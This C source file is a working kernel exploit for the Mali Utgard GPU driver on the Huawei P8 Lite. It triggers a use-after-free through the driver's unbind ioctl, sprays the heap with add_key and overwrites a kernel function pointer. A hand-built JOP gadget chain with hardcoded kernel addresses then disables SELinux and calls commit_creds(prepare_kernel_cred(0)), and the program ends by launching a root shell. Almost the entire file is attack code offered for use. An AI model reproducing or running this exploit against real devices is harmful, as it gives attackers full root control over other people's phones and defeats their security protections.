#include <sys/ioctl.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/socket.h> 
#include <netinet/in.h> 
#include <arpa/inet.h> 
#include <sys/syscall.h>

#define EXPLOIT_ATTEMPTS 10 // number of tries to try the exploit before giving up

#define PREPARE_KERNEL_CRED_ADDR 0xffffffc0000c9900
#define COMMIT_CREDS_ADDR 0xffffffc0000c9500
#define ENFORCING_ADDR 0xffffffc00138d16c

// Mali definitions
#define MALI_IOC_BASE           0x82
#define _MALI_UK_MEMORY_SUBSYSTEM    1
#define MALI_IOC_MEMORY_BASE    (_MALI_UK_MEMORY_SUBSYSTEM + MALI_IOC_BASE)

#define _MALI_UK_ALLOC_MEM      0
#define _MALI_UK_FREE_MEM       1
#define _MALI_UK_UNBIND_MEM     3

#define MALI_IOC_MEM_ALLOC                  _IOWR(MALI_IOC_MEMORY_BASE, _MALI_UK_ALLOC_MEM, _mali_uk_alloc_mem_s)
#define MALI_IOC_MEM_FREE                   _IOWR(MALI_IOC_MEMORY_BASE, _MALI_UK_FREE_MEM, _mali_uk_free_mem_s)
#define MALI_IOC_MEM_UNBIND                 _IOWR(MALI_IOC_MEMORY_BASE, _MALI_UK_UNBIND_MEM, _mali_uk_unbind_mem_s)

typedef struct {
    uint64_t ctx;                   // [in,out] user-kernel context
    uint32_t gpu_vaddr;             // [in] GPU virtual address  
    uint32_t vsize;                 // [in] virtual size of the allocation
    uint32_t psize;                 // [in] physical size of the allocation
    uint32_t flags;                 // [in] allocation flags
    uint32_t backend_handle;        // [out] backend handle
    // int32_t secure_shared_fd;       // [in] the mem handle for secure mem
} _mali_uk_alloc_mem_s;

typedef struct {
	uint64_t ctx;                      /**< [in,out] user-kernel context (trashed on output) */
	uint32_t gpu_vaddr;                /**< [in] use as handle to free allocation */
	uint32_t free_pages_nr;      /** < [out] record the number of free pages */
} _mali_uk_free_mem_s;

typedef struct {
    uint64_t ctx;                // User-kernel context
    uint32_t flags;              // Flags
    uint32_t vaddr;              // Mali address
} _mali_uk_unbind_mem_s;

typedef struct {
    void *addr;
    size_t size;
    int success;
} mmap_result_t;


// Keyring syscall definitions - NO KEYUTILS.H NEEDED
#if defined(__aarch64__)
    #define __NR_add_key 217
    #define __NR_keyctl 219
#elif defined(__arm__)
    #define __NR_add_key 309
    #define __NR_keyctl 311
#endif

#define KEY_SPEC_PROCESS_KEYRING -2
#define KEYCTL_REVOKE 3

typedef int32_t key_serial_t;

// Direct syscall wrapper - no header needed
static inline key_serial_t add_key(const char *type, const char *desc,
                                    const void *payload, size_t plen,
                                    key_serial_t ringid)
{
    return syscall(__NR_add_key, type, desc, payload, plen, ringid);
}

static inline long keyctl_revoke(key_serial_t key)
{
    return syscall(__NR_keyctl, KEYCTL_REVOKE, key);
}


// exploit won't work without this ;)
void important_ascii_art() {
    printf("\n\033[38;5;225m");
    printf("███████ ██████  ███████ ██      ███████ \n");
    printf("\033[38;5;183m");
    printf("██      ██   ██ ██      ██      ██      \n");
    printf("\033[38;5;141m");
    printf("█████   ██████  █████   ██      ███████ \n");
    printf("\033[38;5;99m");
    printf("██      ██   ██ ██      ██           ██ \n");
    printf("\033[38;5;57m");
    printf("██      ██   ██ ███████ ███████ ███████ \n\n");
    printf("            Huawei P8 Lite\n");
    printf("\n\033[0m");
}


_mali_uk_alloc_mem_s mali_alloc_memory(int mali_fd, _mali_uk_alloc_mem_s input) {
    _mali_uk_alloc_mem_s result = input;
    
    int ret = ioctl(mali_fd, MALI_IOC_MEM_ALLOC, &result);
    
    if (ret == -1) {
        printf("  ERROR: %s (errno: %d)\n", strerror(errno), errno);
    }
    
    return result;
}


mmap_result_t mali_mmap_allocation(int mali_fd, uint32_t gpu_vaddr) {
    mmap_result_t mapping;
    
    printf("[+] Memory mapping GPU address 0x%08x...\n", gpu_vaddr);
    
    // mmap the Mali allocation using its GPU virtual address as offset
    // The GPU virtual address becomes the offset for mmap
    void *mapped_addr = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED, 
                            mali_fd, gpu_vaddr);
    
    mapping.size = 4096;
    
    if (mapped_addr == MAP_FAILED) {
        mapping.addr = NULL;
        mapping.success = 0;
        printf("[+] Mapping failed\n");
    } else {
        mapping.addr = mapped_addr;
        mapping.success = 1;
        printf("[+] Successfully mapped\n");
    }
    
    return mapping;
}


void mali_cleanup_mapping_to_do_decrement_on_uaf_obj(mmap_result_t mapping) {
    printf("[*] Causing function pointer overwrite...\n");
    
    if (mapping.success && mapping.addr) {
        if (munmap(mapping.addr, mapping.size) != 0) {
            printf("  Failed to unmap %p: %s\n", mapping.addr, strerror(errno));
        }
    }
}

int trigger_overwritten_function_pointer() {
    const char *dev_path = "/sys/kernel/debug/get_panel_data";
    uint64_t buffer[1024];
    int fd;
    
    // Try to open the device normally
    fd = open(dev_path, O_RDONLY);
    if (fd < 0) {
        return 1;
    }

    // pc control, any gadget here must be <= 2 instructions as 3rd one gets patched to invalid instruction
    // ffffffc000091818 20 00 40 f9     ldr      x0,[x1]
    // ffffffc00009181c 00 00 3f d6     blr      x0
    buffer[0x0] = 0xffffffc0004cde50; // x0

    // get control of x0 for the next gadget (lr fixup thing)
    //   ffffffc0004cde50 20 24 40 f9     ldr        x0,[x1, #0x48]
    //   ffffffc0004cde54 22 20 40 f9     ldr        x2,[x1, #0x40]
    //   ffffffc0004cde58 40 00 3f d6     blr        x2
    buffer[0x48 / 8] = (uint64_t) (buffer + (0x58 / 8)); // x0
    buffer[0x40 / 8] = 0xffffffc00018c000; // x2

    // we wanna call the last gadget with this so that the ret lands in the expected location (syscall read handler)
    //   ffffffc00018c000 04 08 40 f9     ldr        x4,[x0, #0x10]
    //   ffffffc00018c004 e0 03 13 aa     mov        x0,x19
    //   ffffffc00018c008 64 00 00 b4     cbz        x4,LAB_ffffffc00018c014
    //   ffffffc00018c00c 80 00 3f d6     blr        x4
    //   ... we will return execution here hopefully
    buffer[0x68 / 8] = 0xffffffc00031d214; // x2


    // save off important stuff to keep things running smoothly after we wreck them
    //   ffffffc00031d214 fd 7b bd a9     stp        x29,x30,[sp, #-0x30]!
    //   ffffffc00031d218 fd 03 00 91     mov        x29,sp
    //   ffffffc00031d21c f5 5b 02 a9     stp        x21,x22,[sp, #0x20]
    //   ffffffc00031d220 f3 53 01 a9     stp        x19,x20,[sp, #0x10]
    //   ffffffc00031d224 f5 03 01 aa     mov        x21,x1
    //   ffffffc00031d228 f6 03 00 aa     mov        x22,x0
    //   ffffffc00031d22c 21 04 40 f9     ldr        x1,[x1, #0x8]
    //   ffffffc00031d230 b3 46 40 b9     ldr        w19,[x21, #0x44]
    //   ffffffc00031d234 20 00 3f d6     blr        x1
    buffer[0x8 / 8] = 0xffffffc0003df7e8;

    // copy x21 to x0
    //   ffffffc0003df7e8 a1 6e 40 f9     ldr        x1,[x21, #0xd8]
    //   ffffffc0003df7ec e0 03 15 aa     mov        x0,x21
    //   ffffffc0003df7f0 21 08 40 f9     ldr        x1,[x1, #0x10]
    //   ffffffc0003df7f4 20 00 3f d6     blr        x1
    buffer[0xd8 / 8] = (uint64_t) (buffer + (0xc0 / 8)); // x1
    buffer[0xd0 / 8] = 0xffffffc0001e215c; // x1

    // copy x0 back into x1
    //   ffffffc0001e215c a2 16 40 f9     ldr        x2,[x21, #0x28]
    //   ffffffc0001e2160 e1 03 00 aa     mov        x1,x0
    //   ffffffc0001e2164 00 10 40 f9     ldr        x0,[x0, #0x20]
    //   ffffffc0001e2168 42 34 40 f9     ldr        x2,[x2, #0x68]
    //   ffffffc0001e216c 40 00 3f d6     blr        x2
    buffer[0x28 / 8] = (uint64_t) (buffer + (0x10 / 8)); // x2
    buffer[0x20 / 8] = (uint64_t) (buffer + (0x10 / 8));
    buffer[0x78 / 8] = 0xffffffc000a03fe4;

    // copy x1 back into x0 (got clobbered last gadget)                                         *REMOVE??????*
    //   ffffffc000a03fe4 22 40 40 f9     ldr        x2,[x1, #0x80]
    //   ffffffc000a03fe8 f3 03 01 aa     mov        x19,x1
    //   ffffffc000a03fec 62 00 00 b4     cbz        x2,LAB_ffffffc000a03ff8
    //   ffffffc000a03ff0 e0 03 01 aa     mov        x0,x1
    //   ffffffc000a03ff4 40 00 3f d6     blr        x2
    buffer[0x80 / 8] = 0xffffffc00047e76c; // x2

    // ##################################################
    // MAKE SURE X0 POINTS TO BUFFER BASE AFTER THIS AREA
    // ##################################################

    // this loads address of selinux enforcing
    //   ffffffc00047e76c 62 52 40 f9     ldr        x2,[x19, #0xa0]
    //   ffffffc00047e770 60 5e 40 f9     ldr        x0,[x19, #0xb8]
    //   ffffffc00047e774 40 00 3f d6     blr        x2
    buffer[0xa0 / 8] = 0xffffffc0002ff6ac;
    buffer[0xb8 / 8] = ENFORCING_ADDR - 0x38;

    // this sets it to zero
    //   ffffffc0002ff6ac 1f 1c 00 f9     str        xzr,[x0, #0x38]
    //   ffffffc0002ff6b0 21 88 40 f9     ldr        x1,[x1, #0x110]
    //   ffffffc0002ff6b4 20 00 3f d6     blr        x1
    buffer[0x110 / 8] = 0xffffffc0000ed15c;

    // this fixes up x0
    //   ffffffc0000ed15c 62 3a 40 f9     ldr        x2,[x19, #0x70]
    //   ffffffc0000ed160 a2 00 00 b4     cbz        x2,LAB_ffffffc0000ed174
    //   ffffffc0000ed164 e0 03 13 aa     mov        x0,x19
    //   ffffffc0000ed168 40 00 3f d6     blr        x2
    buffer[0x70 / 8] = 0xffffffc00012e120;

    // ##################################################

    // x20 control
    //   ffffffc00012e120 14 08 40 f9     ldr        x20,[x0, #0x10]
    //   ffffffc00012e124 94 c2 00 91     add        x20,x20,#0x30
    //   ffffffc00012e128 81 82 5f f8     ldur       x1,[x20, #-0x8]
    //   ffffffc00012e12c 61 00 00 b4     cbz        x1,LAB_ffffffc00012e138
    //   ffffffc00012e130 20 00 3f d6     blr        x1
    buffer[0x10 / 8] = (uint64_t) (buffer + (0x120 / 8)) ; // x20
    buffer[0x148 / 8] = 0xffffffc00097a98c; // x1 -> pc

    
    // ###### first call kmalloc-128 to get looped freelist address to fix #######
    // using below function at address 0xffffffc0000bac40

    // void possible_allocation_3_128(void)
    // {
    //   void *pvVar1;
    
    //   pvVar1 = kzalloc((int)_DAT_ffffffc0013782f8,0x80d0,0x80);
    //   if (pvVar1 != (void *)0x0) {
    //     *(void **)pvVar1 = pvVar1;
    //     *(long *)((long)pvVar1 + 0x30) = (long)pvVar1 + 0x30;
    //     *(long *)((long)pvVar1 + 0x38) = (long)pvVar1 + 0x30;
    //     *(void **)((long)pvVar1 + 8) = pvVar1;
    //     *(undefined4 *)((long)pvVar1 + 0x58) = 8;
    //   }
    //   return;
    // }

    // call the function and get exec back
    //   ffffffc00097a98c 82 12 40 f9     ldr        x2,[x20, #0x20]
    //   ffffffc00097a990 40 00 3f d6     blr        x2
    //   ffffffc00097a994 f5 03 00 aa     mov        x21,x0
    //   ffffffc00097a998 82 0e 40 f9     ldr        x2,[x20, #0x18]
    //   ffffffc00097a99c e0 03 13 aa     mov        x0,x19
    //   ffffffc00097a9a0 e1 03 15 aa     mov        x1,x21
    //   ffffffc00097a9a4 40 00 3f d6     blr        x2
    buffer[0x170 / 8] = (uint64_t) 0xffffffc0000bac40; // x2
    buffer[0x168 / 8] = (uint64_t) 0xffffffc0000c66a8; // x2

    // allocated thing is now in x1/x21 (and x5 for some reason)
    //   ffffffc0000c66a8 02 18 40 f9     ldr        x2,[x0, #0x30]
    //   ffffffc0000c66ac 13 0c 40 f9     ldr        x19,[x0, #0x18]
    //   ffffffc0000c66b0 42 14 40 f9     ldr        x2,[x2, #0x28]
    //   ffffffc0000c66b4 40 00 3f d6     blr        x2
    buffer[0x30 / 8] = (uint64_t) (buffer + (0x38 / 8)); // x2
    buffer[0x60 / 8] = (uint64_t) 0xffffffc0001d0570; // x2
    buffer[0x18 / 8] = (uint64_t) 0xffffffc00057cf70; // x19, give execution back?

    // fix the freelist by breaking the loop
    //   ffffffc0001d0570 82 1a 40 f9     ldr        x2,[x20, #0x30]
    //   ffffffc0001d0574 a2 02 00 f9     str        x2,[x21]
    //   ffffffc0001d0578 60 02 3f d6     blr        x19
    buffer[0x130 / 8] = 0x0;


    // NOW PRIVESC TO ROOT :) call commit_creds(prepare_kernel_cred(0x0))

    // x20 control
    //   ffffffc00057cf70 01 80 40 f9     ldr        x1,[x0, #0x100]
    //   ffffffc00057cf74 14 44 40 f9     ldr        x20,[x0, #0x88]
    //   ffffffc00057cf78 21 14 40 f9     ldr        x1,[x1, #0x28]
    //   ffffffc00057cf7c 20 00 3f d6     blr        x1
    buffer[0x100 / 8] = (uint64_t) (buffer + (0x10 / 8)); // x1
    buffer[0x88 / 8] = (uint64_t) (buffer + (0x78 / 8)); // x20
    buffer[0x38 / 8] = 0xffffffc0005c2198; // x1

    // clear x0
    //   ffffffc0005c2198 04 28 40 f9     ldr        x4,[x0, #0x50]
    //   ffffffc0005c219c c4 01 00 b4     cbz        x4,LAB_ffffffc0005c21d4
    //   ffffffc0005c21a0 00 00 80 d2     mov        x0,#0x0
    //   ffffffc0005c21a4 43 00 80 52     mov        w3,#0x2
    //   ffffffc0005c21a8 80 00 3f d6     blr        x4
    buffer[0x50 / 8] = 0xffffffc00097a98c;

    // call prepare_kernel_cred and get exec back
    //   ffffffc00097a98c 82 12 40 f9     ldr        x2,[x20, #0x20]
    //   ffffffc00097a990 40 00 3f d6     blr        x2
    //   ffffffc00097a994 f5 03 00 aa     mov        x21,x0
    //   ffffffc00097a998 82 0e 40 f9     ldr        x2,[x20, #0x18]
    //   ffffffc00097a99c e0 03 13 aa     mov        x0,x19
    //   ffffffc00097a9a0 e1 03 15 aa     mov        x1,x21
    //   ffffffc00097a9a4 40 00 3f d6     blr        x2
    buffer[(0x78 + 0x20) / 8] = PREPARE_KERNEL_CRED_ADDR; // x2
    buffer[(0x78 + 0x18) / 8] = 0xffffffc00060d2a8; // x2
    
    // shift x20 along to get new registers
    //   ffffffc00060d2a8 94 e2 08 91     add        x20,x20,#0x238
    //   ffffffc00060d2ac 81 2e 40 f9     ldr        x1,[x20, #0x58]
    //   ffffffc00060d2b0 20 00 3f d6     blr        x1
    buffer[(0x2b0 + 0x58) / 8] = 0xffffffc00031f84c;

    // mov x21 to x0
    //   ffffffc00031f84c 83 62 40 f9     ldr        x3,[x20, #0xc0]
    //   ffffffc00031f850 e1 03 13 aa     mov        x1,x19
    //   ffffffc00031f854 e2 03 17 2a     mov        w2,w23
    //   ffffffc00031f858 e0 03 15 aa     mov        x0,x21
    //   ffffffc00031f85c 60 00 3f d6     blr        x3
    buffer[(0x2b0 + 0xc0) / 8] = 0xffffffc00097a98c;


    // call commit_creds and get exec back
    //   ffffffc00097a98c 82 12 40 f9     ldr        x2,[x20, #0x20]
    //   ffffffc00097a990 40 00 3f d6     blr        x2
    //   ffffffc00097a994 f5 03 00 aa     mov        x21,x0
    //   ffffffc00097a998 82 0e 40 f9     ldr        x2,[x20, #0x18]
    //   ffffffc00097a99c e0 03 13 aa     mov        x0,x19
    //   ffffffc00097a9a0 e1 03 15 aa     mov        x1,x21
    //   ffffffc00097a9a4 40 00 3f d6     blr        x2
    buffer[(0x2b0 + 0x20) / 8] = COMMIT_CREDS_ADDR;
    buffer[(0x2b0 + 0x18) / 8] = 0xffffffc00031d2bc;

    // reload all the stuff we broke to keep system happy :)
    //   ffffffc00031d2bc f3 53 41 a9     ldp        x19,x20,[sp, #local_20]
    //   ffffffc00031d2c0 f5 5b 42 a9     ldp        x21,x22,[sp, #local_10]
    //   ffffffc00031d2c4 fd 7b c3 a8     ldp        x29,x30,[sp], #0x30
    //   ffffffc00031d2c8 c0 03 5f d6     ret


    // Try a small read
    ssize_t bytes_read = read(fd, buffer, sizeof(buffer));
    if (bytes_read < 0) {
        printf("[-] Read failed with error: %s\n", strerror(errno));
    }
    
    close(fd);
    
    return 0;
}

int main() {
    important_ascii_art();

    int mali_fd;

    // Open the Mali device
    mali_fd = open("/dev/mali", O_RDWR);
    if (mali_fd < 0) {
        perror("[-] Failed to open /dev/mali");
        return -1;
    }
    printf("[+] Successfully opened /dev/mali (fd=%d)\n", mali_fd);


    // STEP 1: Use MALI_IOC_MEM_ALLOC to create mali_alloc object in kmalloc-128
    printf("\n[1] Allocate victim mali_alloc\n");
    _mali_uk_alloc_mem_s victim_mali_alloc_input = {0};
    victim_mali_alloc_input.ctx = 0;
    victim_mali_alloc_input.gpu_vaddr = 0x0;
    victim_mali_alloc_input.vsize = 4096;
    victim_mali_alloc_input.psize = 4096;
    victim_mali_alloc_input.flags = 0x0;
    victim_mali_alloc_input.backend_handle = 0;
    
    _mali_uk_alloc_mem_s result = mali_alloc_memory(mali_fd, victim_mali_alloc_input);
    
    printf("[+] Mali allocation successful!\n");
    printf("    GPU VAddr: 0x%08x\n", result.gpu_vaddr);
    printf("    Backend Handle: 0x%08x\n", result.backend_handle);

    

    // STEP 2: Do mmap on this to increment the refcount associated with the mali_alloc object
    printf("\n[2] Doing mali_alloc mmap\n");

    uint32_t victim_mmap_offset = result.gpu_vaddr;
    mmap_result_t mapping = mali_mmap_allocation(mali_fd, victim_mmap_offset);
    
    if (!mapping.success) {
        printf("[-] Failed to create mapping\n");
        close(mali_fd);
        return -1;
    }


    // STEP 3: NOW USE THE BUG TO DECREMENT THE REFCOUNT IN THE VICTIM OBJECT TO JUST BEFORE UAF
    printf("\n[3] Calling MALI_IOC_MEM_UNBIND on victim to decrement refcount\n");
    
    _mali_uk_unbind_mem_s unbind_params;
    memset(&unbind_params, 0, sizeof(unbind_params));
    unbind_params.ctx = result.ctx;
    unbind_params.vaddr = result.gpu_vaddr;
    unbind_params.flags = 0x100; // _MALI_MEMORY_BIND_BACKEND_UMP
    
    int ioc_result = ioctl(mali_fd, MALI_IOC_MEM_UNBIND, &unbind_params);
    if (ioc_result != 0) {
        printf("[-] UNBIND failed: %s\n", strerror(errno));
    }


    // STEP 4: Setup for add_key spray
    printf("\n[4] Setting up add_key spray for fake mali_alloc\n");

    // create fake session in userland
    char fake_session[0x400];
    uint64_t *fake_session_ptr = (uint64_t *)fake_session;
    for (size_t i = 0; i < sizeof(fake_session) / sizeof(uint64_t); i++) {
        fake_session_ptr[i] = 0x0;
    }

    // fix rwlock stuff
    uint32_t* rwlock_thing = (uint32_t*)&fake_session[0x190];
    rwlock_thing[0] = 0x0;
    rwlock_thing[1] = 0xDEAF1EED;

    // fix mutex stuff
    uint64_t* mutex_ting = (uint64_t*)&fake_session[0x1c0];
    mutex_ting[0] = 0x1;
    
    // Prepare spray payload filled with 0x00000001
    // Using 120 bytes to target kmalloc-128 (payload + key overhead)
    char fake_mali_alloc[0x80];
    uint64_t *fake_mali_alloc_ptr = (uint64_t *)fake_mali_alloc;
    for (size_t i = 0; i < sizeof(fake_mali_alloc) / sizeof(uint64_t); i++) {
        fake_mali_alloc_ptr[i] = 0x1;
    }

    fake_mali_alloc_ptr[0x54 / 8] = 0x0;
    fake_mali_alloc_ptr[0x30 / 8] = 0x0;

    fake_mali_alloc_ptr[0x58 / 8] = 0xffffffc000091818; // gadget address
    fake_mali_alloc_ptr[0x60 / 8] = 0xffffffc000bd6720; // function address to overwrite

    fake_mali_alloc_ptr[1] = (uint64_t) fake_session_ptr; // session pointer


    // STEP 5: TRIGGER UAF AND SPRAY
    printf("\n[5] Triggering UAF and spraying with add_key\n");

    // Trigger unbind to free the object
    ioctl(mali_fd, MALI_IOC_MEM_UNBIND, &unbind_params);
    
    // Spray using add_key - this allocates in kmalloc-128
    key_serial_t spray_key = add_key("user", "spray_0", fake_mali_alloc, sizeof(fake_mali_alloc), KEY_SPEC_PROCESS_KEYRING);
    
    if (spray_key < 0) {
        printf("[-] add_key failed: %s, should still be in the heap\n", strerror(errno));
    } else {
        printf("[+] Spray successful (key_id=%d)\n", spray_key);
    }


    // STEP 6: CALL MUNMAP ON THE VICTIM TO DECREMENT THE TARGET POINTER IN THE UAF OBJECT
    printf("\n[6] Cause second mali_mem_allocation_struct_destory on controlled mali_alloc\n");
    mali_cleanup_mapping_to_do_decrement_on_uaf_obj(mapping);


    // Now we have free'd that memory twice and we have looped the freelist
    // This means that every allocation on this cpu in the kmalloc-128 cache will keep recieving this memory
    // We can fix the freelist by breaking the loop
    // The SLUB allocator uses first 8 bytes of free memory to store a pointer to the next free element
    // If we set this to null and dont free the memory, the chain will be broken and this should fix everything
    // Just make sure we don't free the returned memory again
    printf("\n[7] Triggering JOP chain via /sys/kernel/debug/get_panel_data...\n");
    trigger_overwritten_function_pointer();


    // Cleanup: revoke and free key
    printf("\n[8] Cleanup\n");
    if (spray_key > 0) {
        keyctl_revoke(spray_key);
    }
    
    close(mali_fd);
    printf("\n[*] Done! Lets see if we got root...\n");

    if (getuid() == 0) {
        printf("[+] We got root! Popping shell...\n");
        char* shell = "/system/bin/sh";
        char* args[] = {shell, "-i", NULL};
        execve(shell, args, NULL);
    } else {
        printf("[-] Utgard won the battle but not the war... try again\n");
    }

    return 0;
}